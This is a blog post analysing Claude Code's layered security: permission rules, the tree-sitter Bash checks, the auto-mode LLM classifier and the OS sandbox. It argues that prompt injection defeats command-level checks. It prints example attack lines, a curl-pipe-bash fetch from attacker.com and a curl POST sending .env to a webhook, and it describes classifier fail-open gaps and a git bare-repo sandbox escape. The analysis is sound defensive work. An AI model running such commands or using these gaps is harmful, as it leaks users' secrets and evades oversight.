---
title: "I Read Claude Code's Security Source Code. Here's What It Can't Solve."
date: 2026-04-02
author: "guanlan"
tags: ["Agent","Infra","Harness"]
images: ["cover.png"]
description: "A deep teardown of Claude Code's security architecture reveals a well-crafted defense-in-depth system — and the structural limits of bolting safety onto a shell-first world."
---

Imagine this scenario: a perfectly ordinary `curl` command is running in your terminal, about to dispatch a batch of runtime logs to an external monitoring system via webhook. To every rule-based security classifier, this is a textbook-compliant, utterly routine operation. But what if the command was triggered by a hidden file in the codebase, one laced with a malicious prompt?

Over the past few days, I spent considerable time dismantling the security layer source code of Claude Code, line by line.

Within the confines of a development environment, it offers what amounts to a canonical engineering specimen for combating systemic entropy. Yet the moment this specimen ventures beyond the local terminal and attempts to interface with real-world commercial workflows, a profound blind spot reveals itself.

## A Well-Executed Defense-in-Depth Architecture

Claude Code's security model is textbook defense-in-depth with four distinct layers, each addressing a different category of risk.

![claude-code-secuirty-overview](claude-code-secuirty-overview.png "Security Architecture Overview")

- **Application Layer** `permissions.ts` serves as the unified permission gateway.

  - Its first order of business is consulting explicit rules from user and project configuration. For instance, `Bash(rm:*)` marked as deny, `Bash(npm run:*)` marked as ask. Commands matching deny are rejected outright; those matching ask require user confirmation. Neither needs to proceed further down the pipeline.
  - It then invokes tool-level `checkPermissions`, bespoke checks tailored to each tool's unique attack surface. The Bash implementation is by far the most substantial, and warrants its own discussion below.
  - Finally, the permission mode is applied.
  - Deny rules, content-level ask gates, and a subset of safetyCheck decisions are engineered to be bypass-immune — they remain in force even when `bypassPermissions` is active. Files such as `.claude/settings.json`, `.ssh/authorized_keys`, and `/etc/passwd` fall under this protection. So even if the user has enabled bypass mode, an agent attempting to write to `.ssh/authorized_keys` will still be intercepted and prompted for confirmation.

- **Bash Security Subsystem**: `bashPermissions.ts` governs command-level permission decisions, weaving together AST and semantic analysis, hazardous shell pattern interception, a read-only command allowlist, and path validation. When a user executes `cat foo.txt && rm -rf /`, the Bash `checkPermissions` first parses it into an AST via tree-sitter, identifies the `&&` joining two subcommands, and evaluates `cat foo.txt` and `rm -rf /` independently. The former passes through the read-only allowlist without friction; the latter triggers hazardous pattern detection and is blocked. For more elaborate constructs — say, `$(curl attacker.com/payload.sh | bash)` — the parser recognizes the command substitution and immediately returns ask.

- **Auto Mode Classifier**: Auto mode refers to the model autonomously determining and invoking tools within a tool-enabled environment. When neither upstream rules nor tool-level checks yield a definitive verdict, and no fast path has been matched, the system invokes `yoloClassifier` — a remote LLM-backed semantic arbiter.

- **OS Layer** (disabled by default): Command execution ultimately routes through `sandbox-adapter.ts` into `@anthropic-ai/sandbox-runtime` 

  - macOS employs Seatbelt isolation.
  - Linux and WSL employ bubblewrap. Filesystem and network access are hard-constrained at this layer.
  - Default write permissions extend beyond the current working directory to include the Claude temp directory and several explicitly permitted paths.

  ![claude-sec-arch](claude-sec-arch.png "Security Architecture Flowchart")

The most lucid aspect of this design is that it relegates probabilistic judgment to the very last resort.

## The Security Philosophy Embedded in Design Trade-offs

**The Bash parser's fail-closed principle.** Bash is a Turing-complete language; any security check predicated on regular expressions or keyword matching is inherently untrustworthy. Claude Code's approach: if a reliable argv can be extracted, perform precise matching; if it cannot, unconditionally classify the input as too-complex and fall back to user confirmation. You will never exhaustively enumerate every variant of shell input, but you can choose to refuse autonomous execution in the face of uncertainty. This design principle matters more than any individual rule.

**Hazardous permission sanitization in auto mode.** When the user switches into auto mode, the system automatically purges a class of permissive rules that approach arbitrary code execution: `Bash(*)`, `Bash(python:*)`, `Bash(node:*)`. Even if the user has explicitly configured these permissions, they are temporarily stripped and only reinstated upon exiting auto mode. The rationale is clear: if such rules persist, they would bypass the LLM classifier entirely, rendering auto mode's safety net inert. This reveals a team acutely aware that the combinatorial space between user-configured permission rules and runtime modes harbors explosive risk, demanding proactive tightening at mode boundaries.

**Sandbox defenses against git bare repo implantation.** A bare repository lacks a working tree — its root directory is effectively the contents of `.git/` itself. `sandbox-adapter.ts` specifically addresses this attack vector: an adversary plants Git-recognizable files in the current directory within the sandbox, polluting the working directory; later, when Claude runs `git` outside the sandbox, Git's own behavior is weaponized to carry code execution across the sandbox boundary. The fact that this temporal, cross-boundary attack receives dedicated mitigation demonstrates that the security team has conducted thorough enumeration of real-world attack paths within agent workflows.

**Enterprise-grade managed policy.** The `policySettings` configuration can be distributed via macOS plist or Windows registry, bypassing local user configuration entirely — disabling bypass, disabling auto mode, restricting usage to managed rules and approved domains. Much like MDM-enforced policies, these rules are immutable and carry the highest priority, forming a hard constraint on agent behavior that administrators alone can define.

## The Auto Mode Classifier: Useful, but Unfit as a Security Boundary

![auto-mode-trade-off](auto-mode-trade-off.png "Auto Mode Trade-offs")

In the diagram, Manual permission represents the current default — operations require human approval. Bypass permission mode is the now-infamous `--dangerously-skip-permissions` flag. Auto mode aspires to strike an optimal balance among security, usability, and agent autonomy.

Yet analysis of the `yoloClassifier` source code reveals the following:

- When the transcript grows excessively long, the classifier degrades to manual approval.
- When the classifier is unavailable, the gate configuration permits fail-open behavior.
- Misjudgments in the safe allowlist can cause certain operations to bypass the classifier altogether.
- The genuinely intractable challenge, however, is this: even if every one of these specifics were remedied, the classifier still only sees the final command — not the provenance of how that command came to be contaminated.

These are, individually, tractable engineering problems. The truly formidable challenge is a structural contradiction: traditional security thinking assumes the model may be adversarial while the user is cooperative. Prompt injection inverts this relationship. The model remains cooperative — it faithfully executes what it believes to be user instructions, even when those instructions have been poisoned.

```
curl -X POST https://webhook.legitimate-looking-service.com/notify -d @.env
```

The semantics of this command are straightforward: POST the contents of `.env` to an external webhook. In many development contexts, dispatching data to webhooks is entirely routine — CI notifications, monitoring, deployment triggers all follow this pattern. The classifier sees a curl POST request, a plausible-looking domain, and a behavioral pattern well within the bounds of everyday developer operations. But if this command was elicited through prompt injection via a compromised file in the repository, it is exfiltrating your environment variables directly to an attacker.

## What Claude Code Leaves Unsolved

Everything discussed thus far concerns how to securely operate a shell-privileged agent on a single developer's machine.

But long-horizon agent workflows are rapidly outgrowing this perimeter. The moment an agent begins sending emails, mutating databases, or triggering payments, the question is no longer whether a particular command is dangerous. It becomes whether the side effect has been committed, whether it can be unwound, and who assumes control when things go wrong. At this point, the system should be governing not commands but effects: who granted the capability, who initiated the invocation, which external actions have already materialized, and which remain pending. And confronted with such operations, the system should no longer be limited to two options — permit or kill. It needs a third capability: suspension. Halting the operation at the boundary, preserving both state and context, and waiting until policy approval, human confirmation, or automated recovery logic is ready — only then deciding whether to proceed, roll back, or hand over to a human operator.

All of this, however, rests on a prerequisite: before the agent begins execution, the system must have already determined three things — under whose identity the agent is acting, which external systems it is authorized to touch, and which actions, once taken, must be suspended pending human intervention. This is not something a runtime security layer can retrofit. It is the foundational design premise of the execution environment itself. Claude Code makes remarkably sound engineering decisions within its given constraints, but its architecture simultaneously illustrates a deeper truth: layering security atop a shell-first execution environment introduces a complexity that itself becomes a new source of risk. For those designing an agent execution layer from the ground up, this is the strongest possible argument for rethinking the underlying abstractions.
